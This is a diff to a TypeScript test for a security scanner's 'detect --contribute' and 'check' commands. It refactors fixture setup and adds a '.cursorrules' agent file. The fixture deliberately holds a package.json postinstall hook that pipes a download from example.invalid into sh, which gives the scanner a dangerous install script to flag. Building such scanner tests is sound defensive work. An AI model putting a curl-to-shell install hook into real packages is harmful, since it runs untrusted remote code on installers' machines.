@@ -16,7 +16,10 @@
  * contribution queue it was added to, which is what the next flush sends.
  * Cells: the event carries the run's scan time, its findings counted by the
  * severity the run printed, the verdict those severities make, the score the
- * run printed and the time the scan took.
+ * run printed and the time the scan took. The target `detect` scans carries
+ * a `.cursorrules` file, an agent of the project itself, so the run reports
+ * that agent's governance gap on any host: `detect` also lists the agents
+ * running on the host, and a CI runner has none.
  *
  * Each body is also compared, byte for byte after normalizing run-to-run
  * values, with the body the unchanged source sent
@@ -72,6 +75,7 @@ exit 1
 let scratch = '';
 let registry: CaptureRegistry;
 let source = '';
+let detectSource = '';
 let binDir = '';
 let failedShareRun: CliRun;
 let retryRun: CliRun;
@@ -108,27 +112,39 @@ function failedSent(share: Record<string, any>): string[] {
   return share.findings.filter((f: { passed: boolean }) => !f.passed).map((f: { severity: string; name: string }) => `${f.severity} ${f.name}`).sort();
 }
 
+/** The scanned tree: a package with a dangerous install script and a governance file that sets no control. */
+function writeFixture(dir: string): void {
+  fs.mkdirSync(dir, { recursive: true });
+  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
+    name: 'outbound-check',
+    version: '2.0.0',
+    scripts: { postinstall: 'curl -s http://example.invalid/setup.sh | sh' },
+  }, null, 2) + '\n');
+  fs.writeFileSync(path.join(dir, 'SOUL.md'), '# Agent\n\nYou are a helpful assistant. You can read files and call tools.\n');
+}
+
 beforeAll(async () => {
   scratch = tempDir('hma-outbound-check-');
   registry = await startCaptureRegistry(scratch);
   source = path.join(scratch, 'source');
   binDir = path.join(scratch, 'bin');
-  fs.mkdirSync(source, { recursive: true });
   fs.mkdirSync(binDir, { recursive: true });
   fs.writeFileSync(path.join(binDir, 'git'), GIT_SHIM, { mode: 0o755 });
-  fs.writeFileSync(path.join(source, 'package.json'), JSON.stringify({
-    name: 'outbound-check',
-    version: '2.0.0',
-    scripts: { postinstall: 'curl -s http://example.invalid/setup.sh | sh' },
-  }, null, 2) + '\n');
-  fs.writeFileSync(path.join(source, 'SOUL.md'), '# Agent\n\nYou are a helpful assistant. You can read files and call tools.\n');
+  writeFixture(source);
+  // What `detect` scans: the same tree with a `.cursorrules` file, so the run
+  // finds an agent of the project itself and reports its governance gap
+  // whether or not an agent process runs on the host. `check` keeps cloning
+  // `source`, whose scan the recording holds.
+  detectSource = path.join(scratch, 'detect-source');
+  writeFixture(detectSource);
+  fs.writeFileSync(path.join(detectSource, '.cursorrules'), 'Prefer small functions and explicit types.\n');
 
   failedShareRun = check('failed-share', SHARED_URL, 503);
   failedQueue = (queueOf(failedShareRun) as Array<Record<string, any>> | null) ?? [];
   retryRun = check('retry', OTHER_URL, 200, failedQueue);
   retryQueue = queueOf(retryRun);
 
-  detectRun = runCli(['detect', source, '--contribute', '--json'], {
+  detectRun = runCli(['detect', detectSource, '--contribute', '--json'], {
     runDir: path.join(scratch, 'detect'), registry, before: seedContributionQueue,
   });
   detectPrinted = JSON.parse(detectRun.stdout);
@@ -228,7 +244,7 @@ describe('detect --contribute', () => {
 
   it('names the package the run scanned, and no local path', () => {
     expect(detectEvent.package).toEqual({ name: 'outbound-check', version: '2.0.0', ecosystem: 'npm' });
-    expect(localPathsIn(detectEvent, [scratch, source, detectRun.cwd, detectRun.home, os.homedir()])).toEqual([]);
+    expect(localPathsIn(detectEvent, [scratch, detectSource, detectRun.cwd, detectRun.home, os.homedir()])).toEqual([]);
   });
 });
 
